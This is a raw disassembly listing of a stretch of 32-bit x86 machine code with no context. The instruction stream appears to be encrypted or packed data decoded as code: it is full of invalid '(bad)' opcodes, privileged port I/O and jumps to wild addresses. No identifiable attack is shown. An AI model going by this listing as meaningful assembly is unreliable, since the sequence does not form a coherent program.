  41a512:	sbb    bh,BYTE PTR [esi-0x2]
  41a515:	add    eax,0x8522264
  41a51a:	rcl    BYTE PTR [edi],0x8a
  41a51d:	clc    
  41a51e:	inc    edi
  41a51f:	mov    dl,0x95
  41a521:	xchg   ecx,eax
  41a522:	sub    al,0xb3
  41a524:	cmp    DWORD PTR [ebp-0x4b448a17],esp
  41a52a:	daa    
  41a52b:	test   al,0xb7
  41a52d:	jg     0x41a4b5
  41a52f:	sub    al,0xd0
  41a531:	jmp    0xec83410c
  41a536:	mov    ebx,0x36b8b28e
  41a53b:	mov    ds:0xadc88438,al
  41a540:	jl     0x41a579
  41a542:	cmp    al,0x2b
  41a544:	ja     0x41a564
  41a546:	arpl   WORD PTR [ebp-0x7e4c25a],bp
  41a54c:	sub    al,0x1d
  41a54e:	test   DWORD PTR [edx],ecx
  41a550:	add    bh,cl
  41a552:	and    BYTE PTR [eax+0x39570a05],bl
  41a558:	js     0x41a56f
  41a55a:	lahf   
  41a55b:	sbb    dh,cl
  41a55d:	pop    ebx
  41a55e:	xchg   edi,eax
  41a55f:	jl     0x41a583
  41a561:	int3   
  41a562:	ja     0x41a4ef
  41a564:	pop    edi
  41a565:	push   ss
  41a566:	out    0x75,eax
  41a568:	imul   ebx,DWORD PTR [edi+0x32],0xffffff95
  41a56c:	push   ebp
  41a56d:	mov    eax,ss:0xb575aa1
  41a573:	xchg   esp,edi
  41a575:	fistp  DWORD PTR [esi+0x70af11b1]
  41a57b:	dec    ebx
  41a57c:	jle    0x41a5f7
  41a57e:	loope  0x41a5c5
  41a580:	pusha  
  41a581:	daa    
  41a582:	sub    al,0x43
  41a584:	or     BYTE PTR [edx],ch
  41a586:	xor    al,0x5d
  41a588:	or     BYTE PTR [ecx-0x490bc246],al
  41a58e:	jp     0x41a55a
  41a590:	xor    dl,bh
  41a592:	(bad)  
  41a593:	mov    ebx,esp
  41a595:	mov    DWORD PTR [edi+eiz*2],esi
  41a598:	lods   eax,DWORD PTR ds:[esi]
  41a599:	or     BYTE PTR [edx-0x629101ba],cl
  41a59f:	and    BYTE PTR ds:0x8172eb14,cl
  41a5a5:	jmp    0x4060:0x37920fa7
  41a5ac:	imul   ebx,DWORD PTR [ecx-0x1b],0xc0b9be05
  41a5b3:	or     DWORD PTR ss:[esp+edi*4-0x49255095],eax
  41a5bb:	lea    ecx,[edx]
  41a5bd:	arpl   WORD PTR [ebx],dx
  41a5bf:	push   0xff07d465
  41a5c4:	inc    esi
  41a5c5:	or     BYTE PTR [ecx*1+0x2cda617c],cl
  41a5cc:	push   ss
  41a5cd:	inc    eax
  41a5ce:	mov    ds:0xaf97c13f,eax
  41a5d3:	lods   al,BYTE PTR ds:[esi]
  41a5d4:	sub    eax,0x789305e1
  41a5d9:	clc    
  41a5da:	xchg   esp,eax
  41a5db:	add    ebx,eax
  41a5dd:	iret   
  41a5de:	(bad)  
  41a5e0:	es xor eax,edi
  41a5e3:	dec    edx
  41a5e4:	mov    dl,0x17
  41a5e6:	jmp    0x41a64b
  41a5e8:	cmc    
  41a5e9:	and    DWORD PTR [ecx+edx*4],ecx
  41a5ec:	sbb    BYTE PTR [ebp-0x36064793],bh
  41a5f2:	jmp    0x41a5fd
  41a5f4:	rcl    DWORD PTR [edi],0xec
  41a5f7:	mov    cl,0x5c
  41a5f9:	xlat   BYTE PTR ds:[ebx]
  41a5fa:	push   eax
  41a5fb:	jo     0x41a62d
  41a5fd:	xchg   ebp,eax
  41a5fe:	xchg   edi,eax
  41a5ff:	mov    ch,0xd0
  41a601:	push   ebx
  41a602:	or     ebx,DWORD PTR [ebx+0x6e3d9310]
  41a608:	push   eax
  41a609:	dec    esp
  41a60a:	inc    edi
  41a60b:	stc    
  41a60c:	mov    ah,0xd7
  41a60e:	scas   eax,DWORD PTR es:[edi]
  41a60f:	mov    edx,0x33ad44c5
  41a614:	in     eax,0x34
  41a616:	(bad)  
  41a617:	leave  
  41a618:	xor    eax,0x69b32227
  41a61d:	or     al,0x40
  41a61f:	adc    DWORD PTR ds:0xfe7fc0a,edi
  41a625:	inc    eax
  41a626:	mov    dh,0x7c
  41a628:	in     eax,dx
  41a629:	daa    
  41a62a:	push   esi
  41a62b:	int    0x8
  41a62d:	pop    esi
  41a62e:	fmul   DWORD PTR [ebx-0x20]
  41a631:	in     eax,dx
  41a632:	jl     0x41a6a6
  41a634:	xchg   edx,eax
  41a635:	mov    dh,BYTE PTR [edi-0x80]
  41a638:	loop   0x41a669
  41a63a:	mov    dl,0xfb
  41a63c:	adc    ebp,ebp
  41a63e:	mov    bl,0xb2
  41a640:	push   ss
  41a641:	inc    esp
  41a642:	(bad)  
  41a644:	ja     0x41a630
  41a646:	dec    ebx
  41a647:	sub    esi,DWORD PTR [ecx+0x268ead48]
  41a64d:	test   al,0xb5
  41a64f:	cmp    DWORD PTR [eax-0x495ef6d0],esi
  41a655:	mov    al,ds:0xa9857cb5
  41a65a:	repnz mov ebx,0x1f245dac
  41a660:	je     0x41a656
  41a662:	sub    edi,ecx
  41a664:	(bad)  
  41a665:	adc    ecx,DWORD PTR [ebx]
  41a667:	fiadd  WORD PTR [ebx]
  41a669:	es jo  0x41a6e4
  41a66c:	mov    ah,0x97
  41a66e:	aad    0xe2
  41a670:	test   al,0x20
  41a672:	mov    eax,ds:0x4cac42f3
  41a677:	dec    ebp
  41a678:	jb     0x41a6b7
  41a67a:	jge    0x41a69a
  41a67c:	ins    BYTE PTR es:[edi],dx
  41a67d:	bound  edi,QWORD PTR [edi-0x5a]
  41a680:	aaa    
  41a681:	mov    DWORD PTR [edi+0x337eb513],ebx
  41a687:	jnp    0x41a60d
  41a689:	in     al,dx
  41a68a:	cld    
  41a68b:	in     al,dx
  41a68c:	mov    ebx,0xedab2185
  41a691:	add    ecx,DWORD PTR [edi+0x6ab2806b]
  41a697:	or     al,0xf1
  41a699:	xor    DWORD PTR [edi],esp
  41a69b:	test   eax,0x82c6e96c
  41a6a0:	mov    esi,0x23531c11
  41a6a5:	push   ss
  41a6a6:	xor    al,0x63
  41a6a8:	mov    ds:0x7fe265f4,eax
  41a6ad:	mov    ch,0xff
  41a6af:	xor    dl,BYTE PTR [edi+0x570d9279]
  41a6b5:	clc    
  41a6b6:	xchg   edx,eax
  41a6b7:	xor    eax,0x53c447de
  41a6bc:	out    dx,al
  41a6bd:	xchg   BYTE PTR [ecx-0x68b4e6f8],cl
  41a6c3:	add    cl,BYTE PTR [ebx+ebx*2]
  41a6c6:	add    BYTE PTR [ecx-0x7b4a696e],0x37
  41a6cd:	cmp    ebx,DWORD PTR [edi+esi*8+0x33da5ddd]
  41a6d4:	jecxz  0x41a6d3
  41a6d6:	jne    0x41a752
  41a6d8:	jmp    0x41a66a
  41a6da:	jb     0x41a6dd
  41a6dc:	adc    DWORD PTR [ebx+0x72],esi
  41a6df:	fiadd  DWORD PTR [esi+0x34]
  41a6e2:	stos   BYTE PTR es:[edi],al
  41a6e3:	(bad)  
  41a6e4:	clc    
  41a6e5:	dec    ebp
  41a6e6:	jecxz  0x41a689
  41a6e8:	in     al,0x5f
  41a6ea:	mov    fs,WORD PTR ds:[edi-0x59]
  41a6ee:	repnz mov bl,0xe3
  41a6f1:	adc    eax,0x73b4099c
  41a6f6:	ins    DWORD PTR es:[edi],dx
  41a6f7:	adc    BYTE PTR [ebx+0x62],bh
  41a6fa:	pop    esp
  41a6fb:	loop   0x41a6e1
  41a6fd:	jnp    0x41a775
  41a6ff:	mov    eax,eax
  41a701:	out    dx,al
  41a702:	pop    eax
  41a703:	mov    ebp,0xdb50cf4e
  41a708:	iret   
  41a709:	out    dx,al
  41a70a:	out    0x7,al
  41a70c:	xor    BYTE PTR [edi],bl
  41a70e:	fwait
  41a70f:	sbb    dh,BYTE PTR [ecx-0x53a8a077]
  41a715:	cmp    al,0x3a
  41a717:	aaa    
  41a718:	lods   eax,DWORD PTR ds:[esi]
  41a719:	das    
  41a71a:	ret    
  41a71b:	sbb    edi,DWORD PTR [esi]
  41a71d:	jno    0x41a71c
  41a71f:	shl    BYTE PTR [ecx-0x35ec1109],0x1b
  41a726:	xor    bh,BYTE PTR [eax+0x725a5cc5]
  41a72c:	imul   ebx,DWORD PTR [esi],0x1a
  41a72f:	pushf  
  41a730:	orps   xmm5,XMMWORD PTR [ecx+0x56f82b8a]
  41a737:	mov    eax,ds:0x4f26a20d
  41a73c:	or     al,BYTE PTR [edx-0x66]
  41a73f:	sbb    al,0x8f
  41a741:	cwde   
  41a742:	or     ebp,ecx
  41a744:	lock push edi
  41a746:	jmp    0x41a794
  41a748:	sti    
  41a749:	dec    edi
  41a74a:	bound  ebx,QWORD PTR [ecx+0x70]
  41a74d:	into   
  41a74e:	lock ja 0x41a7c0
  41a751:	inc    ecx
  41a752:	dec    ebp
  41a753:	pop    eax
  41a754:	jle    0x41a7be
  41a756:	hlt    
  41a757:	cmp    al,0x65
  41a759:	loope  0x41a7c0
  41a75b:	ds fs sbb edx,ebx
  41a75f:	out    0x32,al
  41a761:	push   ds
  41a762:	jno    0x41a768
  41a764:	dec    ebp
  41a765:	sbb    edi,DWORD PTR [ebx+0x3b0aaae9]
  41a76b:	not    DWORD PTR [ebp+0x67]
  41a76e:	imul   ebp,DWORD PTR [eax],0x6b
  41a771:	dec    esp
  41a772:	test   ebx,ecx
  41a774:	repnz cs mov ebp,0xcc7e7602
  41a77b:	icebp  
  41a77c:	sahf   
  41a77d:	ins    BYTE PTR es:[edi],dx
  41a77e:	xor    cl,BYTE PTR [eax]
  41a780:	jge    0x41a7f1
  41a782:	mov    ds:0xd112f2b9,al
  41a787:	test   DWORD PTR [ebx-0x58],edi
  41a78a:	aad    0x3d
  41a78c:	sbb    BYTE PTR [esi-0x4d548c6f],bl
  41a792:	push   ss
  41a793:	cmp    bl,BYTE PTR [edi-0x30]
  41a796:	add    DWORD PTR [esi+edi*8-0x1],edi
  41a79a:	loopne 0x41a7b0
  41a79c:	mov    ecx,0x18011b27
  41a7a1:	cs cdq 
  41a7a3:	adc    eax,0xce208e4e
  41a7a8:	mov    es,esp
  41a7aa:	push   di
  41a7ac:	add    al,0xb5
  41a7ae:	ds mov dl,0x6d
  41a7b1:	int    0xd9
  41a7b3:	gs mov eax,0x9ea2cad1
  41a7b9:	xchg   ecx,eax
  41a7ba:	xlat   BYTE PTR ds:[ebx]
  41a7bb:	ret    
  41a7bc:	sbb    cl,BYTE PTR [eax]
  41a7be:	cmp    ch,al
  41a7c0:	iret   
  41a7c1:	mov    ds:0xffc9601,al
  41a7c6:	and    dh,BYTE PTR [ebx]
  41a7c8:	sbb    ebx,DWORD PTR ds:0xae98065f
  41a7ce:	jl     0x41a83e
  41a7d0:	or     esp,edx
  41a7d2:	mov    ebx,DWORD PTR ds:0xc8744c8f
  41a7d8:	push   es
  41a7d9:	imul   ecx,esi,0xc68316bd
  41a7df:	frstor [edx]
  41a7e1:	xchg   ebp,eax
  41a7e2:	je     0x41a7b6
  41a7e4:	xchg   ebx,eax
  41a7e5:	dec    edi
  41a7e6:	xchg   edi,eax
  41a7e7:	mov    edi,0xfb1d74db
  41a7ec:	arpl   WORD PTR [edx+0x3c43fdd2],cx
  41a7f2:	jmp    0xb3f7e718
  41a7f7:	stos   BYTE PTR es:[edi],al
  41a7f8:	xchg   ecx,eax
  41a7f9:	out    0x9,al
  41a7fb:	hlt    
  41a7fc:	gs loop 0x41a7e5
  41a7ff:	xlat   BYTE PTR ds:[ebx]
  41a800:	ja     0x41a7c5
  41a802:	push   es
  41a803:	test   DWORD PTR [esi-0x16322eeb],esi
  41a809:	xor    al,ch
  41a80b:	xchg   ebx,eax
  41a80c:	dec    eax
  41a80d:	popa   
  41a80e:	xchg   ecx,eax
  41a80f:	push   ebx
  41a810:	mov    ch,cl
  41a812:	jge    0x41a87b
  41a814:	pop    esp
  41a815:	loopne 0x41a7c8
  41a817:	mov    dl,0xb8
  41a819:	and    eax,0xbfb644d7
  41a81e:	adc    dh,BYTE PTR [eax+0x45afdc8a]
  41a824:	sbb    BYTE PTR [edx+ecx*1+0xe],ch
  41a828:	inc    esi
  41a829:	imul   ebp,DWORD PTR [edi-0x75],0xfffffff5
  41a82d:	sub    ah,BYTE PTR [eax]
  41a82f:	inc    edi
  41a830:	or     DWORD PTR [ebx-0x67bcf3f1],esp
  41a836:	and    cl,BYTE PTR [eax]
  41a838:	out    0x35,eax
  41a83a:	add    eax,0x616efdd2
  41a83f:	pop    eax
  41a840:	dec    ebp
  41a841:	push   ecx
  41a842:	mov    al,ds:0x7e96ff87
  41a847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a848:	add    BYTE PTR [eax],dl
  41a84a:	lods   eax,DWORD PTR ds:[esi]
  41a84b:	out    dx,al
  41a84c:	add    DWORD PTR [edx+0x2e],eax
  41a84f:	ins    BYTE PTR es:[edi],dx
  41a850:	jae    0x41a7f0
  41a852:	mov    edx,0x7910bdc8
  41a857:	int    0xc9
  41a859:	jle    0x41a89f
  41a85b:	xchg   DWORD PTR ds:0x3f0cdb9d,edx
  41a861:	jmp    0xdc1119b3
  41a866:	inc    esp
  41a867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a868:	das    
  41a869:	xor    edi,DWORD PTR [eax]
  41a86b:	xor    BYTE PTR [edi-0x77],bh
  41a86e:	(bad)  
  41a870:	dec    edi
  41a871:	cwde   
  41a872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a873:	dec    esp
  41a874:	and    BYTE PTR [edi+eiz*2+0x1b],bh
  41a878:	adc    DWORD PTR [edi],edi
  41a87a:	jge    0x41a84d
  41a87c:	xchg   edi,eax
  41a87d:	cmp    dh,BYTE PTR [edi]
  41a87f:	jbe    0x41a80d
  41a881:	test   al,0x95
  41a883:	jmp    0x41a8ac
  41a885:	imul   ebx,DWORD PTR [ebp-0x2d677223],0x661bf2dc
  41a88f:	pop    eax
  41a890:	lods   eax,DWORD PTR ds:[esi]
  41a891:	push   edx
  41a892:	cmp    esi,DWORD PTR [ecx+eax*1+0x74]
  41a896:	mov    bl,0x9
  41a898:	xchg   BYTE PTR ds:0x5817345e,cl
  41a89e:	xchg   edi,eax
  41a89f:	fist   DWORD PTR es:[ebp+0x7f47211e]
  41a8a6:	dec    ecx
  41a8a7:	gs imul esi,esp,0x83876d07
  41a8ae:	das    
  41a8af:	pop    edi
  41a8b0:	iret   
  41a8b1:	fadd   QWORD PTR [esi+0x39]
  41a8b4:	in     al,dx
  41a8b5:	xchg   ebp,eax
  41a8b6:	mov    WORD PTR [edi+0x3ba47a9c],es
  41a8bc:	sbb    eax,DWORD PTR [ecx-0xc]
  41a8bf:	sbb    eax,0x7b05ebb7
  41a8c4:	add    al,0xf9
  41a8c6:	sbb    BYTE PTR [esi],bh
  41a8c8:	cmp    BYTE PTR [eiz*4-0x2cb0b525],bl
  41a8cf:	in     al,dx
  41a8d0:	cld    
  41a8d1:	pushf  
  41a8d2:	test   DWORD PTR [edi],esi
  41a8d4:	or     ecx,edx
  41a8d6:	jp     0x41a8c2
  41a8d8:	add    esi,DWORD PTR [ebp+0x6432143c]
  41a8de:	rcr    ecx,1
  41a8e0:	push   ss
  41a8e1:	jp     0x41a900
  41a8e3:	sbb    eax,esi
  41a8e5:	je     0x41a8b2
  41a8e7:	stc    
  41a8e8:	jge    0x41a8d2
  41a8ea:	in     al,0x64
  41a8ec:	mov    al,0xca
  41a8ee:	mov    ds:0x3179ff20,al
  41a8f3:	or     DWORD PTR [edx],ebp
  41a8f5:	push   0x9b03aee4
  41a8fa:	mov    dl,0xcb
  41a8fc:	and    dh,ah
  41a8fe:	imul   ebp
  41a900:	fisttp WORD PTR [ebp+0x672dbaaa]
  41a906:	arpl   sp,ax
  41a908:	fwait
  41a909:	clc    
  41a90a:	rcl    BYTE PTR [eax],1
  41a90c:	add    bh,BYTE PTR [ebx+0x2c]
  41a90f:	test   al,0x11
  41a911:	mov    ds:0xf2d68502,eax
  41a916:	xchg   ebp,eax
  41a917:	sbb    ch,ah
  41a919:	push   edi
  41a91a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a91b:	sbb    esp,ebx
  41a91d:	mov    bh,0xba
  41a91f:	nop
  41a920:	test   eax,0x35c1a6d2
  41a925:	popa   
  41a926:	adc    eax,edx
  41a928:	inc    edx
  41a929:	daa    
  41a92a:	mov    cl,0x36
  41a92c:	nop
  41a92d:	mov    ?,WORD PTR [ebx+eiz*8]
  41a930:	xchg   ecx,eax
  41a931:	(bad)  
  41a932:	mov    bh,0x90
  41a934:	sar    DWORD PTR ds:0x21e0c3a5,1
  41a93a:	out    0x27,al
  41a93c:	cdq    
  41a93d:	cmc    
  41a93e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a93f:	pmaddwd mm7,QWORD PTR [ebp-0x57]
  41a943:	cmp    eax,0x65f82ace
  41a948:	pushf  
  41a949:	cli    
  41a94a:	add    eax,0xe29f1961
  41a94f:	es mov esi,esp
  41a952:	(bad)  
  41a953:	adc    al,0x42
  41a955:	mov    DWORD PTR [ebx-0x6198c0a7],ebp
  41a95b:	and    bh,BYTE PTR [ecx]
  41a95d:	js     0x41a965
  41a95f:	hlt    
  41a960:	inc    edx
  41a961:	bound  edx,QWORD PTR [ebx]
  41a963:	mov    DWORD PTR [edi-0x7],ecx
  41a966:	imul   esi,DWORD PTR [ebp+0x4e],0x36
  41a96a:	sub    al,0x68
  41a96c:	lods   eax,DWORD PTR ds:[esi]
  41a96d:	ja     0x41a9c3
  41a96f:	push   ecx
  41a970:	sbb    edx,edi
  41a972:	mov    ch,0x85
  41a974:	std    
  41a975:	adc    ebp,DWORD PTR [edx-0x2a8181c4]
  41a97b:	aaa    
  41a97c:	lods   al,BYTE PTR ds:[esi]
  41a97d:	inc    edi
  41a97e:	je     0x41a975
  41a980:	leave  
  41a981:	mov    esi,0x78d9e162
  41a986:	not    DWORD PTR [edx]
  41a988:	xchg   BYTE PTR [edx],bl
  41a98a:	mov    cl,0xbd
  41a98c:	inc    edi
  41a98d:	cmp    eax,0x3dd7e165
  41a992:	add    ecx,ecx
  41a994:	mov    dl,0x25
  41a996:	cdq    
  41a997:	cmp    edi,DWORD PTR [eax+ebx*1]
  41a99a:	fbld   TBYTE PTR [esi-0x56]
  41a99d:	jg     0x41a95b
  41a99f:	aad    0xd0
  41a9a1:	sbb    al,bl
  41a9a3:	push   ebp
  41a9a4:	(bad)  [ebp+0x2c]
  41a9a7:	xchg   ebx,eax
  41a9a8:	call   0xe9f4c441
  41a9ad:	mov    ebp,0xf7d5650c
  41a9b2:	xor    ebp,DWORD PTR [eax]
  41a9b4:	xor    eax,0xa174d06f
  41a9b9:	cmp    al,0xc5
  41a9bb:	sub    BYTE PTR [eax],dh
  41a9bd:	(bad)  
  41a9be:	push   edi
  41a9bf:	lea    ecx,[ebx]
  41a9c1:	sub    DWORD PTR [eax+0x5d58c2c0],ebp
  41a9c7:	pop    edi
  41a9c8:	sub    ebx,0xffffff8b
  41a9cb:	mov    al,0xc6
  41a9cd:	adc    esp,DWORD PTR [edx]
  41a9cf:	outs   dx,BYTE PTR ds:[esi]
  41a9d0:	jae    0x41a9e6
  41a9d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9d3:	xchg   ecx,eax
  41a9d4:	arpl   WORD PTR [ebp+0x6],ax
  41a9d7:	or     eax,0xead9646f
  41a9dc:	push   ds
  41a9dd:	popf   
  41a9de:	xor    ah,BYTE PTR [eax]
  41a9e0:	mov    ebp,edi
  41a9e2:	mov    ds:0x4550f441,eax
  41a9e7:	mov    edx,0xb85f90bd
  41a9ec:	pop    eax
  41a9ed:	inc    edx
  41a9ee:	std    
  41a9ef:	ss dec dh
  41a9f2:	and    ebx,ebp
  41a9f4:	cmp    DWORD PTR [ebx-0x3f4ce2b0],edi
  41a9fa:	rcr    DWORD PTR [esi+0x41629cfb],0xe9
  41aa01:	inc    eax
  41aa02:	push   ds
  41aa03:	in     al,dx
  41aa04:	inc    esp
  41aa05:	ficomp DWORD PTR [esi-0x7c]
  41aa08:	in     eax,0x21
  41aa0a:	add    edi,DWORD PTR [esi+0x6412eae3]
  41aa10:	enter  0x6c69,0xaa
  41aa14:	fdiv   st(1),st
  41aa16:	repz xor al,0x14
  41aa19:	adc    al,0xd3
  41aa1b:	sbb    cx,WORD PTR [ecx-0x56]
  41aa1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa20:	rol    BYTE PTR [edx],cl
  41aa22:	es sub al,0xa3
  41aa25:	sub    BYTE PTR [eax],dl
  41aa27:	scas   al,BYTE PTR es:[edi]
  41aa28:	aaa    
  41aa29:	inc    ecx
  41aa2a:	lea    eax,[eax+0x78]
  41aa2d:	push   es
  41aa2e:	inc    edx
  41aa2f:	aaa    
  41aa30:	pop    eax
  41aa31:	lea    ebp,[esi-0x45]
  41aa34:	inc    eax
  41aa35:	push   es
  41aa36:	leave  
  41aa37:	sub    eax,0x8b8936fc
  41aa3c:	call   0x5e6e097e
  41aa41:	(bad)  
  41aa43:	stos   BYTE PTR es:[edi],al
  41aa44:	pop    esp
  41aa45:	sti    
  41aa46:	or     ecx,edi
  41aa48:	mov    ebx,0xb7c79dfb
  41aa4d:	dec    esi
  41aa4e:	adc    eax,0x4ffe8f77
  41aa53:	fdiv   QWORD PTR [ebx+0x3c]
  41aa56:	out    0x12,al
  41aa58:	stos   BYTE PTR es:[edi],al
  41aa59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa5a:	dec    eax
  41aa5b:	cs push esi
  41aa5d:	mov    edx,0xaf7434ca
  41aa62:	jle    0x41aa3a
  41aa64:	mov    eax,gs:0x66cff59f
  41aa6a:	or     al,0xdd
  41aa6c:	push   0x40
  41aa6e:	add    ebp,DWORD PTR [ebx-0x762fc5]
  41aa74:	add    eax,0xa6865304
  41aa79:	sahf   
  41aa7a:	mov    edx,0x992f99d8
  41aa7f:	aas    
  41aa80:	lahf   
  41aa81:	jb     0x41aa7b
  41aa83:	(bad)  
  41aa84:	sbb    eax,0x2350962d
  41aa89:	jbe    0x41aada
  41aa8b:	mov    al,ds:0xf1afd133
  41aa90:	aas    
  41aa91:	cvtps2pd xmm5,xmm1
  41aa94:	enter  0x16e9,0x7b
  41aa98:	or     DWORD PTR ds:0x6d485d07,esi
  41aa9e:	les    edi,FWORD PTR [edx+0x4d093e47]
  41aaa4:	int3   
  41aaa5:	pop    ds
  41aaa6:	pusha  
  41aaa7:	pushf  
  41aaa8:	scas   al,BYTE PTR es:[edi]
  41aaa9:	jnp    0x41aaab
  41aaab:	and    al,0xcb
  41aaad:	jg     0x41aa89
  41aaaf:	ja     0x41ab23
  41aab1:	jnp    0x41aa33
  41aab3:	mov    edi,DWORD PTR [ebx-0x682f9b1e]
  41aab9:	dec    edi
  41aaba:	dec    edi
  41aabb:	int3   
  41aabc:	test   al,0xed
  41aabe:	jne    0x41aa7d
  41aac0:	ins    DWORD PTR es:[edi],dx
  41aac1:	or     BYTE PTR [esi-0x3909dff7],al
  41aac7:	dec    eax
  41aac8:	imul   cl
  41aaca:	aaa    
  41aacb:	shl    DWORD PTR ds:0x733d0f5,0x73
  41aad2:	popa   
  41aad3:	mov    BYTE PTR [edi+0x1e],bl
  41aad6:	xchg   ebp,eax
  41aad7:	stos   BYTE PTR es:[edi],al
  41aad8:	xchg   BYTE PTR [esi+0x7c1c428f],bh
  41aade:	out    0x17,al
  41aae0:	and    al,0x76
  41aae2:	inc    eax
  41aae3:	fisubr WORD PTR [ebp+ebx*2+0x775643ff]
  41aaea:	add    BYTE PTR [ecx],ch
  41aaec:	daa    
  41aaed:	fimul  WORD PTR [esi+ebp*2]
  41aaf0:	xor    al,0x9f
  41aaf2:	dec    ebp
  41aaf3:	aaa    
  41aaf4:	stos   DWORD PTR es:[edi],eax
  41aaf5:	fistp  DWORD PTR [edx]
  41aaf7:	sub    dl,BYTE PTR ds:0x823d6072
  41aafd:	loope  0x41ab35
  41aaff:	add    bl,BYTE PTR [ebx+0x6cfd4d20]
  41ab05:	fst    DWORD PTR es:[edx+0x3765cf9f]
  41ab0c:	and    eax,0xd16b83f7
  41ab11:	in     eax,dx
  41ab12:	(bad)  
  41ab13:	xchg   esp,eax
  41ab14:	shr    DWORD PTR [ebp-0xe],0x3
  41ab18:	aas    
  41ab19:	punpcklbw mm3,DWORD PTR [eax]
  41ab1c:	adc    dh,al
  41ab1e:	out    dx,eax
  41ab1f:	mov    bl,0x56
  41ab21:	enter  0xd30e,0x7c
  41ab25:	out    0xfb,eax
  41ab27:	ror    BYTE PTR [edi-0x34b7fc61],cl
  41ab2d:	add    al,0xd
  41ab2f:	push   esi
  41ab30:	loope  0x41aba1
  41ab32:	sub    edx,DWORD PTR [ebx-0x29af0afc]
  41ab38:	rcr    bl,0x1
  41ab3b:	dec    ecx
  41ab3c:	icebp  
  41ab3d:	out    0x57,eax
  41ab3f:	add    dl,BYTE PTR [edx]
  41ab41:	lea    eax,[ecx]
  41ab43:	push   edi
  41ab44:	xor    eax,0xa6b50be
  41ab49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab4a:	xchg   esi,eax
  41ab4b:	ss fs mov ch,0xc2
  41ab4f:	push   ebp
  41ab50:	fcom   QWORD PTR [edi-0x4f24e7e4]
  41ab56:	push   es
  41ab57:	and    eax,0x6bbd3b3
  41ab5c:	sar    BYTE PTR [esi],cl
  41ab5e:	adc    eax,0x42e8dc60
  41ab63:	icebp  
  41ab64:	scas   eax,DWORD PTR es:[edi]
  41ab65:	and    esp,DWORD PTR [edx]
  41ab67:	jl     0x41ab85
  41ab69:	jmp    0xeec66e4c
  41ab6e:	inc    ebx
  41ab6f:	cmp    esp,DWORD PTR [esi-0x75]
  41ab72:	and    BYTE PTR [ebx],0x9b
  41ab75:	pop    eax
  41ab76:	lock cmp ecx,DWORD PTR [ebp+0x388b5d58]
  41ab7d:	fisttp WORD PTR [eax+0x1e]
  41ab80:	rcl    BYTE PTR [esi+0x21],0xaf
  41ab84:	(bad)  
  41ab85:	retf   0x4381
  41ab88:	sbb    al,0xbf
  41ab8a:	test   BYTE PTR [eax+esi*4+0x24147184],al
  41ab91:	call   0x6cffb4b7
  41ab96:	not    BYTE PTR [edi-0x662401f1]
  41ab9c:	or     esp,eax
  41ab9e:	ins    BYTE PTR es:[edi],dx
  41ab9f:	cld    
  41aba0:	repz cmc 
  41aba2:	push   ebx
  41aba3:	rol    DWORD PTR [ecx-0x4cdfd58b],cl
  41aba9:	jnp    0x41aba8
  41abab:	mov    esp,0x2cba96b3
  41abb0:	popf   
  41abb1:	sub    al,0xd9
  41abb3:	xchg   ebx,eax
  41abb4:	inc    edi
  41abb5:	mov    bh,0x7
  41abb7:	jmp    0x27494eda
  41abbc:	adc    bh,BYTE PTR [edx+0x477d33e9]
  41abc2:	(bad)
  41abc6:	push   es
  41abc7:	les    esp,FWORD PTR [eax]
  41abc9:	enter  0x1c01,0x80
  41abcd:	test   eax,0x5a44310a
  41abd2:	pop    ecx
  41abd3:	popa   
  41abd4:	loopne 0x41abf4
  41abd6:	and    eax,0x261483dd
  41abdb:	enter  0xd766,0x30
  41abdf:	mov    fs,WORD PTR [edx]
  41abe1:	inc    ebx
  41abe2:	outs   dx,BYTE PTR ds:[esi]
  41abe3:	lea    edi,[edx+0x1a]
  41abe6:	pop    es
  41abe7:	mov    ebx,0x96e9c9eb
  41abec:	sub    ebx,ebx
  41abee:	(bad)  
  41abef:	leave  
  41abf0:	rol    BYTE PTR ds:0x5969bcc,1
  41abf6:	int3   
  41abf7:	adc    eax,DWORD PTR [ecx-0x754b078e]
  41abfd:	ds xchg esi,eax
  41abff:	push   ecx
  41ac00:	push   cs
  41ac01:	into   
  41ac02:	mov    al,0x42
  41ac04:	in     al,dx
  41ac05:	inc    eax
  41ac06:	xor    al,0xc1
  41ac08:	and    al,0x28
  41ac0a:	(bad)  
  41ac0b:	daa    
  41ac0c:	stc    
  41ac0d:	dec    ebp
  41ac0e:	lds    edi,FWORD PTR [edx+edx*2-0x55]
  41ac12:	xchg   edx,eax
  41ac13:	jg     0x41aba5
  41ac15:	mov    al,ds:0x9c56a446
  41ac1a:	jno    0x41abdb
  41ac1c:	xchg   ebx,eax
  41ac1d:	inc    ecx
  41ac1e:	or     bh,BYTE PTR [esi]
  41ac20:	aad    0x29
  41ac22:	cmp    BYTE PTR [ebp-0x7a],al
  41ac25:	sbb    ecx,ebx
  41ac27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac28:	enter  0x9d86,0x92
  41ac2c:	das    
  41ac2d:	mov    edx,0x944343af
  41ac32:	(bad)  
  41ac33:	push   ss
  41ac34:	pop    ss
  41ac35:	js     0x41ac7f
  41ac37:	ja     0x41ac05
  41ac39:	cs icebp 
  41ac3b:	push   0x6f0dd20b
  41ac40:	imul   ebp,DWORD PTR [edi+0x14e03bee],0x22549b80
  41ac4a:	lods   eax,DWORD PTR ds:[esi]
  41ac4b:	push   eax
  41ac4c:	xchg   BYTE PTR [ecx+0x49],dl
  41ac4f:	test   BYTE PTR [esi-0xac5b73c],bl
  41ac55:	jmp    0x809b7847
  41ac5a:	fisttp WORD PTR [esi+0x7f9b77e7]
  41ac60:	and    eax,0xc07aa361
  41ac65:	mov    edi,0x6761c867
  41ac6a:	rol    DWORD PTR [edi+0xf],1
  41ac6d:	dec    ebp
  41ac6e:	hlt    
  41ac6f:	jge    0x41aca4
  41ac71:	sbb    BYTE PTR [ebx-0x34],dh
  41ac74:	fcom   DWORD PTR es:[ecx]
  41ac77:	dec    esp
  41ac78:	enter  0x4192,0xfb
  41ac7c:	fidiv  WORD PTR [ecx+0x14]
